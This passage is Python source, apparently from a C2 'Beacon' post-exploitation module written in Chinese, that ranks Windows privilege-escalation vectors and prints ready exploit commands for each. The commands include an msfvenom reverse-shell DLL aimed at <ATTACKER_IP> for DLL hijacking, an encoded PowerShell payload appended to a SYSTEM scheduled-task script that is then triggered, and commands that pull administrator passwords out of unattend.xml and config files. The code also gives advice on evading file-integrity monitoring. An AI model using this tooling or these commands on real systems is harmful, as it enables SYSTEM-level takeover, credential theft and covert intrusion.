                title=f"发现 {len(high_value)} 个高价值 DLL 劫持候选路径",
                description=(
                    f"以下系统路径对当前用户可写，可用于 DLL 劫持:\n"
                    + "\n".join(f"  - {p}" for p in high_value[:5]) +
                    ("\n  ..." if len(high_value) > 5 else "")
                ),
                risk_score=55,
                exploit_method=(
                    "1. 使用 Process Monitor 识别 SYSTEM 进程加载的缺失 DLL\n"
                    "2. 使用 msfvenom 生成恶意 DLL\n"
                    "3. 将恶意 DLL 放置到可写路径\n"
                    "4. 等待 SYSTEM 进程加载或主动触发"
                ),
                exploit_command=(
                    '# 生成恶意 DLL\n'
                    'msfvenom -p windows/x64/shell_reverse_tcp '
                    'LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll '
                    f'-o "{high_value[0]}\\<missing_dll>.dll"'
                ),
                expected_result="以 SYSTEM 权限获取反向 Shell",
                risk_note=(
                    "DLL 劫持需要精确识别目标进程加载的 DLL 搜索顺序。"
                    "建议使用 Sysinternals Process Monitor 进行分析。"
                ),
                reference="https://attack.mitre.org/techniques/T1574/001/",
                details={
                    "high_value_paths": high_value,
                    "other_paths": other,
                    "total_candidates": len(candidates),
                },
            ))
        elif other:
            findings.append(self._make_finding(
                title=f"发现 {len(other)} 个可写系统路径（潜在 DLL 劫持点）",
                description=(
                    f"以下路径对当前用户可写，可能用于 DLL 劫持:\n"
                    + "\n".join(f"  - {p}" for p in other[:5])
                ),
                risk_score=35,
                exploit_method="需进一步分析哪些 SYSTEM 进程从这些路径加载 DLL。",
                exploit_command="",
                expected_result="",
                risk_note="需要配合 Process Monitor 确定具体利用方法。",
                reference="https://attack.mitre.org/techniques/T1574/001/",
                details={"writable_paths": other, "total": len(other)},
            ))

        return findings


class CredentialFileRule(BaseAnalysisRule):
    """凭据文件发现分析规则

    检查是否发现可能包含凭据的配置文件。
    包括 unattend.xml、web.config、SSH 密钥、浏览器密码存储等。
    """

    name = "CredentialFile"
    category = "credential_file"
    sort_order = 9

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        fs_info = data.filesystem_info
        findings: List[RiskFinding] = []

        cred_files = fs_info.credential_files_found
        unattend_files = fs_info.unattend_files
        config_files = fs_info.config_files_with_creds

        if unattend_files:
            findings.append(self._make_finding(
                title=f"发现 {len(unattend_files)} 个无人值守安装文件 - 可能包含明文凭据",
                description=(
                    f"发现以下 unattend/sysprep 文件:\n"
                    + "\n".join(f"  - {f}" for f in unattend_files) +
                    "\n这些文件通常包含本地管理员密码（Base64 编码）。"
                ),
                risk_score=70,
                exploit_method=(
                    "读取 unattend.xml 中的 AdministratorPassword 字段，"
                    "Base64 解码后获取明文管理员密码。"
                ),
                exploit_command=(
                    f'type "{unattend_files[0]}" | findstr /i "AdministratorPassword"'
                ),
                expected_result="获取本地管理员明文密码",
                risk_note=(
                    "Windows 在安装完成后应自动删除 unattend.xml，"
                    "但某些部署工具可能遗留该文件。"
                ),
                reference="https://attack.mitre.org/techniques/T1552/001/",
                details={
                    "unattend_files": unattend_files,
                    "total_cred_files": len(cred_files),
                },
            ))

        if config_files:
            findings.append(self._make_finding(
                title=f"发现 {len(config_files)} 个可能包含凭据的配置文件",
                description=(
                    f"发现以下配置文件:\n"
                    + "\n".join(f"  - {f}" for f in config_files[:10]) +
                    ("\n  ..." if len(config_files) > 10 else "")
                ),
                risk_score=45,
                exploit_method=(
                    "检查这些配置文件是否包含明文密码、连接字符串或 API 密钥。"
                ),
                exploit_command=f'findstr /s /i /p "password pwd connectionString" "{config_files[0]}"',
                expected_result="可能获取数据库凭据、API 密钥或其他敏感信息",
                risk_note="凭据可能已过期或权限不足，需逐一验证。",
                reference="https://attack.mitre.org/techniques/T1552/",
                details={
                    "config_files": config_files,
                    "total_cred_files": len(cred_files),
                },
            ))

        if cred_files and not unattend_files and not config_files:
            findings.append(self._make_finding(
                title=f"发现 {len(cred_files)} 个敏感文件",
                description=(
                    f"发现以下可能包含敏感信息的文件:\n"
                    + "\n".join(f"  - {f}" for f in cred_files[:10])
                ),
                risk_score=30,
                exploit_method="检查这些文件是否包含可利用的凭据或敏感信息。",
                exploit_command="",
                expected_result="",
                risk_note="需手动审查文件内容。",
                reference="",
                details={"cred_files": cred_files},
            ))

        return findings


class ScheduledTaskRule(BaseAnalysisRule):
    """计划任务脚本可写分析规则

    检测以 SYSTEM 运行且执行脚本对当前用户可写的计划任务。
    攻击者可修改脚本内容，在任务触发时以 SYSTEM 权限执行任意代码。
    """

    name = "ScheduledTask"
    category = "scheduled_task"
    sort_order = 10

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        autostart = data.autostart_info
        findings: List[RiskFinding] = []

        writable_tasks = [
            t for t in autostart.scheduled_tasks
            if t.is_system_task and t.is_script_writable
        ]

        if writable_tasks:
            top = writable_tasks[0]
            findings.append(self._make_finding(
                title=f"发现 {len(writable_tasks)} 个以 SYSTEM 运行且脚本可写的计划任务",
                description=(
                    f"共发现 {len(writable_tasks)} 个计划任务以 SYSTEM 权限运行，"
                    f"且其执行脚本对当前用户可写。"
                    f"示例: {top.name} -> {top.actions}。"
                    "攻击者可修改脚本内容，在任务触发时以 SYSTEM 权限执行任意代码。"
                ),
                risk_score=82,
                exploit_method=(
                    "1. 备份原始脚本\n"
                    "2. 在脚本末尾追加恶意命令（如反向 Shell）\n"
                    "3. 等待计划任务触发或手动触发\n"
                    "4. 获取 Shell 后恢复原始脚本"
                ),
                exploit_command=(
                    f'# 备份脚本\n'
                    f'copy "{top.actions[0]}" "{top.actions[0]}.bak"\n'
                    f'# 追加 payload\n'
                    f'echo powershell -enc <BASE64_PAYLOAD> >> "{top.actions[0]}"\n'
                    f'# 手动触发任务\n'
                    f'schtasks /run /tn "{top.path}{top.name}"'
                ),
                expected_result="以 SYSTEM 权限获取反向 Shell",
                risk_note=(
                    "修改脚本可能被文件完整性监控(FIM)检测。"
                    "建议在非工作时间操作并快速恢复。"
                ),
                reference="https://attack.mitre.org/techniques/T1053/005/",
                details={
                    "total_writable": len(writable_tasks),
                    "tasks": [
                        {
                            "name": t.name,
                            "path": t.path,
                            "actions": t.actions,
                            "triggers": t.triggers,
                        }
                        for t in writable_tasks
                    ],
                },
            ))

        system_tasks = [t for t in autostart.scheduled_tasks if t.is_system_task]
        if system_tasks and not writable_tasks:
            findings.append(self._make_finding(
                title=f"发现 {len(system_tasks)} 个以 SYSTEM 运行的计划任务（脚本不可写）",
                description=(
                    f"共发现 {len(system_tasks)} 个以 SYSTEM 权限运行的计划任务，"
                    "但其脚本不可写。可进一步检查任务依赖的 DLL 或配置文件是否可写。"
                ),
                risk_score=25,
                exploit_method="检查任务执行路径下的其他文件（DLL/配置文件）是否可写。",
                exploit_command="",
                expected_result="",
                risk_note="需要进一步分析任务执行链中的文件权限。",
                reference="",
                details={"total_system_tasks": len(system_tasks)},
            ))

        return findings


class OutdatedSoftwareRule(BaseAnalysisRule):
    """过时软件分析规则

    检测已安装的过时软件版本，这些软件可能存在已知漏洞可用于提权。
    """

    name = "OutdatedSoftware"
    category = "outdated_software"
    sort_order = 11

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        sw_info = data.software_info
        findings: List[RiskFinding] = []

        outdated = sw_info.outdated_software
        if not outdated:
            return findings

        high_risk = [s for s in outdated if s.get("risk", 0) >= 70]
        medium_risk = [s for s in outdated if 50 <= s.get("risk", 0) < 70]

        if high_risk:
            top = high_risk[0]
            findings.append(self._make_finding(
                title=f"发现 {len(high_risk)} 个高风险过时软件 - 可用于提权",
                description=(
                    f"发现以下高风险过时软件:\n"
                    + "\n".join(
                        f"  - {s['software']} v{s['installed_version']} "
                        f"(漏洞版本: {s['vulnerable_version']})"
                        for s in high_risk
                    ) +
                    f"\n示例利用: {top.get('exploit', '')}"
                ),
                risk_score=top.get("risk", 70),
                exploit_method=top.get("exploit", ""),
                exploit_command="",
                expected_result="可能获取 SYSTEM 权限或实现虚拟机逃逸",
                risk_note="过时软件漏洞利用需要对应的 EXP，部分可能需要编译。",
                reference="",
                details={
                    "high_risk_software": high_risk,
                    "total_outdated": len(outdated),
                },
            ))

        if medium_risk:
            findings.append(self._make_finding(
                title=f"发现 {len(medium_risk)} 个中等风险过时软件",
                description=(
                    f"发现以下中等风险过时软件:\n"
                    + "\n".join(
                        f"  - {s['software']} v{s['installed_version']}"
                        for s in medium_risk
                    )
                ),
                risk_score=50,
                exploit_method="检查对应软件的已知 CVE 漏洞。",
                exploit_command="",
                expected_result="",
                risk_note="中等风险软件可能需要特定条件才能利用。",
                reference="",
                details={"medium_risk_software": medium_risk},
            ))

        return findings


class VMEscapeRule(BaseAnalysisRule):
    """虚拟机逃逸分析规则

    检测是否在虚拟机中运行，并分析是否存在虚拟机逃逸可能。
    包括 VMware/VirtualBox 版本检测、共享文件夹/剪贴板配置等。
    """

    name = "VMEscape"
    category = "vm_escape"
    sort_order = 12

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        os_info = data.os_info
        sw_info = data.software_info
        findings: List[RiskFinding] = []

        if not os_info.is_virtual_machine:
            return findings

        vm_type = os_info.vm_type

        vm_software = [
            s for s in sw_info.outdated_software
            if any(kw in s.get("software", "").lower()
                   for kw in ["vmware", "virtualbox", "hyper-v"])
        ]

        if vm_software:
            top = vm_software[0]
            findings.append(self._make_finding(
                title=f"检测到 {vm_type} 虚拟机 + 过时虚拟化软件 - 可能存在逃逸风险",
                description=(
                    f"当前运行在 {vm_type} 虚拟机中，且发现过时虚拟化软件: "
                    f"{top['software']} v{top['installed_version']}。"
                    "过时的虚拟化软件可能存在 Guest-to-Host 逃逸漏洞。"
                ),
                risk_score=top.get("risk", 70),
                exploit_method=top.get("exploit", ""),
                exploit_command="",
                expected_result="从虚拟机逃逸至宿主机",
                risk_note=(
                    "虚拟机逃逸是极高风险操作，仅在授权红队演练中使用。"
                    "逃逸失败可能导致虚拟机崩溃。"
                ),
                reference="",
                details={
                    "vm_type": vm_type,
                    "vulnerable_software": vm_software,
                },
            ))
        else:
            findings.append(self._make_finding(
                title=f"检测到 {vm_type} 虚拟机环境",
                description=(
                    f"当前系统运行在 {vm_type} 虚拟机中。"
                    f"检测详情: {os_info.vm_details}。"
                    "虚拟机环境本身不构成风险，但可作为横向移动的跳板。"
                ),
                risk_score=0,
                exploit_method="",
                exploit_command="",
                expected_result="",
                risk_note="",
                reference="",
                details={
                    "vm_type": vm_type,
                    "vm_details": os_info.vm_details,
                },
            ))

        return findings


class SystemInfoRule(BaseAnalysisRule):
    """系统信息汇总规则

    生成纯信息类发现，包括 OS 版本、架构、安装日期等。
    这些信息不构成直接风险但有助于渗透测试决策。
    """

    name = "SystemInfo"
    category = "system_info"
    sort_order = 99

    def analyze(self, data: PrivescCollectionResult) -> List[RiskFinding]:
        os_info = data.os_info
        user_info = data.user_info
        findings: List[RiskFinding] = []

        findings.append(self._make_finding(
            title="系统基本信息",
            description=(
                f"操作系统: {os_info.product_name} ({os_info.edition})\n"
                f"版本: {os_info.version} | 构建号: {os_info.build_number}\n"
                f"体系结构: {os_info.architecture}\n"
                f"计算机名: {os_info.computer_name} | 域: {os_info.domain}\n"
                f"安装日期: {os_info.install_date}\n"
                f"上次启动: {os_info.last_boot_time}\n"
                f"时区: {os_info.timezone}"
            ),
            risk_score=0,
            details={
                "os_name": os_info.os_name,
                "version": os_info.version,
                "build_number": os_info.build_number,
                "edition": os_info.edition,
                "architecture": os_info.architecture,
                "install_date": os_info.install_date,
                "last_boot_time": os_info.last_boot_time,
                "computer_name": os_info.computer_name,
                "domain": os_info.domain,
                "product_name": os_info.product_name,
                "is_vm": os_info.is_virtual_machine,
                "vm_type": os_info.vm_type,
            },
        ))

        findings.append(self._make_finding(
            title="当前用户与权限信息",
            description=(
                f"当前用户: {user_info.current_user_domain}\\{user_info.current_user}\n"
                f"SID: {user_info.current_user_sid}\n"
                f"完整性级别: {user_info.integrity_level}\n"
                f"管理员: {'是' if user_info.is_admin else '否'} | "
                f"SYSTEM: {'是' if user_info.is_system else '否'} | "
                f"已提升: {'是' if user_info.is_elevated else '否'}\n"
                f"UAC: {'启用' if user_info.uac_enabled else '禁用'} "
                f"(级别: {user_info.uac_level})\n"
                f"本地组: {', '.join(user_info.local_groups[:5])}\n"
                f"管理员组成员: {', '.join(user_info.local_administrators[:5])}"
            ),
            risk_score=0,
            details={
                "current_user": user_info.current_user,
                "integrity_level": user_info.integrity_level,
                "is_admin": user_info.is_admin,
                "is_system": user_info.is_system,
                "is_elevated": user_info.is_elevated,
                "uac_enabled": user_info.uac_enabled,
                "local_administrators": user_info.local_administrators,
            },
        ))

        patch_info = data.patch_info
        findings.append(self._make_finding(
            title="补丁状态",
            description=(
                f"已安装补丁: {patch_info.total_patches} 个\n"
                f"缺失关键补丁: {len(patch_info.missing_patches)} 个\n"
                f"可利用 CVE: {len(patch_info.cve_findings)} 个"
            ),
            risk_score=0,
            details={
                "total_patches": patch_info.total_patches,
                "missing_patches_count": len(patch_info.missing_patches),
                "cve_findings_count": len(patch_info.cve_findings),
            },
        ))

        service_info = data.service_info
        findings.append(self._make_finding(
            title="服务与驱动状态",
            description=(
                f"总服务数: {service_info.total_services}\n"
                f"未引号路径服务: {len(service_info.unquoted_path_services)}\n"
                f"可写二进制服务: {len(service_info.writable_binary_services)}\n"
                f"配置错误服务: {len(service_info.misconfigured_services)}\n"
                f"漏洞驱动: {len(service_info.vulnerable_drivers)}\n"
                f"第三方驱动: {len(service_info.third_party_drivers)}"
            ),
            risk_score=0,
            details={
                "total_services": service_info.total_services,
                "unquoted_count": len(service_info.unquoted_path_services),
                "writable_count": len(service_info.writable_binary_services),
                "misconfigured_count": len(service_info.misconfigured_services),
                "vuln_drivers_count": len(service_info.vulnerable_drivers),
            },
        ))

        net_info = data.network_info
        findings.append(self._make_finding(
            title="网络状态",
            description=(
                f"TCP 监听端口: {len(net_info.listening_tcp_ports)} 个\n"
                f"UDP 监听端口: {len(net_info.listening_udp_ports)} 个\n"
                f"端口转发规则: {len(net_info.port_forwarding_rules)} 条\n"
                f"网络接口: {len(net_info.network_interfaces)} 个\n"
                f"DNS 服务器: {', '.join(net_info.dns_servers[:3])}"
            ),
            risk_score=0,
            details={
                "tcp_ports": [p.get("port") for p in net_info.listening_tcp_ports],
                "udp_ports": [p.get("port") for p in net_info.listening_udp_ports],
                "interfaces": len(net_info.network_interfaces),
            },
        ))

        return findings


# =============================================================================
# 主分析引擎
# =============================================================================

class PrivescAnalyzer:
    """Windows提权风险分析引擎

    对收集的系统信息进行多维度风险分析，自动评分、颜色标记、生成利用建议。

    分析流程:
        1. 加载所有分析规则
        2. 并发执行各规则（每个规则独立分析一个维度）
        3. 汇总所有风险发现
        4. 按评分降序排列
        5. 计算综合风险评分
        6. 生成摘要与优先建议

    Attributes:
        _rules: 已注册的分析规则列表
        _quick_mode: 是否快速模式
    """

    def __init__(self, quick_mode: bool = False) -> None:
        """初始化风险分析引擎

        Args:
            quick_mode: 是否快速模式（仅分析高危向量）
        """
        self._quick_mode = quick_mode
        self._rules: List[BaseAnalysisRule] = self._build_rule_chain()

    def _build_rule_chain(self) -> List[BaseAnalysisRule]:
        """构建分析规则链

        按优先级排列规则，快速模式下跳过低优先级规则。

        Returns:
            分析规则列表
        """
        all_rules: List[BaseAnalysisRule] = [
            AlwaysInstallElevatedRule(),
            UnquotedServicePathRule(),
            WritableServiceRule(),
            CVEPatchMissingRule(),
            VulnerableDriverRule(),
            TokenPrivilegeRule(),
            UACConfigRule(),
            ScheduledTaskRule(),
            CredentialFileRule(),
            DLLHijackRule(),
            OutdatedSoftwareRule(),
            VMEscapeRule(),
            SystemInfoRule(),
        ]

        if self._quick_mode:
            quick_categories = {
                "always_install_elevated",
                "unquoted_service_path",
                "writable_service",
                "cve_patch_missing",
                "vulnerable_driver",
                "token_privilege",
                "uac_config",
                "scheduled_task",
            }
            return [r for r in all_rules if r.category in quick_categories]

        return all_rules

    async def analyze(self, data: PrivescCollectionResult) -> PrivescAnalysisResult:
        """执行完整风险分析

        并发执行所有分析规则，汇总结果。

        Args:
            data: 收集结果

        Returns:
            PrivescAnalysisResult: 分析结果
        """
        import time
        start_time = time.time()

        result = PrivescAnalysisResult(
            timestamp=datetime.now().isoformat(),
            hostname=data.hostname,
        )

        all_findings: List[RiskFinding] = []
        errors: List[str] = []

        async def _run_rule(rule: BaseAnalysisRule) -> Tuple[List[RiskFinding], Optional[str]]:
            try:
                loop = asyncio.get_running_loop()
                findings = await loop.run_in_executor(None, rule.analyze, data)
                return findings, None
            except Exception as e:
                error_msg = f"规则 {rule.name} 执行失败: {e}"
                logger.error(error_msg, exc_info=True)
                return [], error_msg

        tasks = [_run_rule(rule) for rule in self._rules]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, Exception):
                errors.append(str(res))
                continue
            findings_part, error = res
            if error:
                errors.append(error)
            all_findings.extend(findings_part)

        all_findings.sort(key=lambda f: (-f.risk_score, f.sort_order))

        result.findings = all_findings

        for f in all_findings:
            if f.risk_level == RiskLevel.CRITICAL:
                result.critical_count += 1
            elif f.risk_level == RiskLevel.HIGH:
                result.high_count += 1
            elif f.risk_level == RiskLevel.MEDIUM:
                result.medium_count += 1
            elif f.risk_level == RiskLevel.LOW:
                result.low_count += 1
            else:
                result.info_count += 1

        result.overall_risk_score = self._calculate_overall_score(all_findings)
        result.overall_risk_level = _score_to_risk_level(result.overall_risk_score)
        result.overall_color = _score_to_color(result.overall_risk_score)

        result.summary = self._generate_summary(result)
        result.recommendations = self._generate_recommendations(result)
        result.collection_summary = self._build_collection_summary(data, errors)
        result.analysis_duration = round(time.time() - start_time, 2)

        return result

    @staticmethod
    def _calculate_overall_score(findings: List[RiskFinding]) -> int:
        """计算综合风险评分

        取所有非零评分的加权平均值，最高分占更大权重。

        Args:
            findings: 风险发现列表

        Returns:
            综合评分 0-100
        """
        scored = [f for f in findings if f.risk_score > 0]
        if not scored:
            return 0

        if len(scored) == 1:
            return scored[0].risk_score

        top_score = scored[0].risk_score
        avg_score = sum(f.risk_score for f in scored) / len(scored)

        return int(top_score * 0.6 + avg_score * 0.4)

    @staticmethod
    def _generate_summary(result: PrivescAnalysisResult) -> str:
        """生成分析摘要

        Args:
            result: 分析结果

        Returns:
            摘要文本
        """
        total_risks = result.critical_count + result.high_count + result.medium_count

        if result.overall_risk_score >= 90:
            return (
                f"【严重风险】目标主机 {result.hostname} 存在几乎确定可提权的配置。"
                f"综合评分: {result.overall_risk_score}/100。"
                f"发现 {result.critical_count} 个严重风险、{result.high_count} 个高风险。"
                f"建议立即执行提权操作。"
            )
        if result.overall_risk_score >= 70:
            return (
                f"【高风险】目标主机 {result.hostname} 存在高度可能的提权向量。"
                f"综合评分: {result.overall_risk_score}/100。"
                f"发现 {result.critical_count} 个严重风险、{result.high_count} 个高风险。"
                f"建议优先尝试评分最高的提权方法。"
            )
        if result.overall_risk_score >= 50:
            return (
                f"【中等风险】目标主机 {result.hostname} 存在可利用的提权向量。"
                f"综合评分: {result.overall_risk_score}/100。"
                f"发现 {total_risks} 个中高风险项。"
                f"建议逐一验证利用条件。"
            )
        if result.overall_risk_score >= 1:
            return (
                f"【低风险】目标主机 {result.hostname} 存在低风险提权向量。"
                f"综合评分: {result.overall_risk_score}/100。"
                f"发现 {total_risks} 个风险项。"
                f"建议结合其他信息综合判断。"
            )
        return (
            f"【信息】目标主机 {result.hostname} 未发现明显提权向量。"
            f"综合评分: 0/100。"
            f"建议检查是否已具有目标权限。"
        )

    @staticmethod
    def _generate_recommendations(result: PrivescAnalysisResult) -> List[str]:
        """生成优先建议列表

        Args:
            result: 分析结果

        Returns:
            建议列表
        """
        recommendations: List[str] = []

        critical_high = [
            f for f in result.findings
            if f.risk_score >= 70
        ]

        for f in critical_high[:5]:
            if f.exploit_command:
                recommendations.append(
                    f"[评分 {f.risk_score}] {f.title} - "
                    f"利用: {f.exploit_method[:100]}"
                )
            else:
                recommendations.append(
                    f"[评分 {f.risk_score}] {f.title}"
                )

        if not recommendations:
            recommendations.append(
                "未发现高可靠性提权向量，建议:\n"
                "  1. 检查是否有其他未收集的提权信息\n"
                "  2. 尝试手动枚举（如 PowerUp.ps1 / PrivescCheck.ps1）\n"
                "  3. 考虑横向移动至其他主机"
            )

        return recommendations

    @staticmethod
    def _build_collection_summary(
        data: PrivescCollectionResult, errors: List[str],
    ) -> Dict[str, Any]:
        """构建收集数据摘要

        Args:
            data: 收集结果
            errors: 分析过程中的错误

        Returns:
            摘要字典
        """
        return {
            "collection_timestamp": data.timestamp,
            "hostname": data.hostname,
            "collection_duration": data.collection_duration,
            "collection_errors": data.errors,
            "analysis_errors": errors,
            "os_summary": {
                "product_name": data.os_info.product_name,
                "build_number": data.os_info.build_number,
                "architecture": data.os_info.architecture,
                "is_vm": data.os_info.is_virtual_machine,
                "vm_type": data.os_info.vm_type,
            },
            "user_summary": {
                "current_user": data.user_info.current_user,
                "integrity_level": data.user_info.integrity_level,
                "is_admin": data.user_info.is_admin,
                "is_elevated": data.user_info.is_elevated,
            },
            "patch_summary": {
                "total_patches": data.patch_info.total_patches,
                "missing_critical": len(data.patch_info.missing_patches),
                "cve_findings": len(data.patch_info.cve_findings),
            },
            "service_summary": {
                "total_services": data.service_info.total_services,
                "unquoted_paths": len(data.service_info.unquoted_path_services),
                "writable_binaries": len(data.service_info.writable_binary_services),
                "vulnerable_drivers": len(data.service_info.vulnerable_drivers),
            },
            "autostart_summary": {
                "always_install_elevated": data.autostart_info.always_install_elevated,
                "uac_level": data.autostart_info.uac_level,
                "scheduled_tasks": len(data.autostart_info.scheduled_tasks),
                "run_keys": len(data.autostart_info.run_keys),
            },
            "filesystem_summary": {
                "writable_system_paths": len(data.filesystem_info.writable_system_paths),
                "credential_files": len(data.filesystem_info.credential_files_found),
                "unattend_files": len(data.filesystem_info.unattend_files),
            },
            "network_summary": {
                "tcp_listening": len(data.network_info.listening_tcp_ports),
                "udp_listening": len(data.network_info.listening_udp_ports),
                "port_forwarding": len(data.network_info.port_forwarding_rules),
            },
            "software_summary": {
                "total_installed": data.software_info.total_installed,
                "outdated": len(data.software_info.outdated_software),
            },
        }


# =============================================================================
# 便捷函数 - Beacon命令集成入口
# =============================================================================

async def run_privesc_check(
    collector: Any = None,
    quick_mode: bool = False,
) -> PrivescAnalysisResult:
    """执行完整提权检查（收集→分析→回传）

    Beacon 命令 privesc_check / privesc_quick 的入口函数。

    Args:
        collector: 可选的预配置 PrivescCollector 实例
        quick_mode: 是否快速模式

    Returns:
        PrivescAnalysisResult: 分析结果（可直接 JSON 序列化回传）
    """
    from .privesc_collector import PrivescCollector

    if collector is None:
        collector = PrivescCollector(quick_mode=quick_mode)

    if quick_mode:
        collection_result = await collector.collect_quick()
    else:
        collection_result = await collector.collect_full()

    analyzer = PrivescAnalyzer(quick_mode=quick_mode)
    analysis_result = await analyzer.analyze(collection_result)

    return analysis_result


async def run_privesc_compare(cve_id: str) -> Dict[str, Any]:
    """检查特定 CVE 是否可利用

    Beacon 命令 privesc_compare <cve-id> 的入口函数。

    Args:
        cve_id: CVE 编号（如 CVE-2021-36934）

    Returns:
        检查结果字典
    """
    from .privesc_collector import PrivescCollector

    collector = PrivescCollector()
    result = await collector.check_specific_cve(cve_id)

    if result.get("is_exploitable"):
        result["risk_level"] = _score_to_risk_level(result.get("risk_score", 0)).value
        result["color"] = _score_to_color(result.get("risk_score", 0)).value

    return result


__all__ = [
    "PrivescAnalyzer",
    "PrivescAnalysisResult",
    "RiskFinding",
    "RiskLevel",
    "RiskColor",
    "run_privesc_check",
    "run_privesc_compare",
    "BaseAnalysisRule",
    "AlwaysInstallElevatedRule",
    "UnquotedServicePathRule",
    "WritableServiceRule",
    "CVEPatchMissingRule",
    "VulnerableDriverRule",
    "TokenPrivilegeRule",
    "UACConfigRule",
    "DLLHijackRule",
    "CredentialFileRule",
    "ScheduledTaskRule",
    "OutdatedSoftwareRule",
    "VMEscapeRule",
    "SystemInfoRule",
]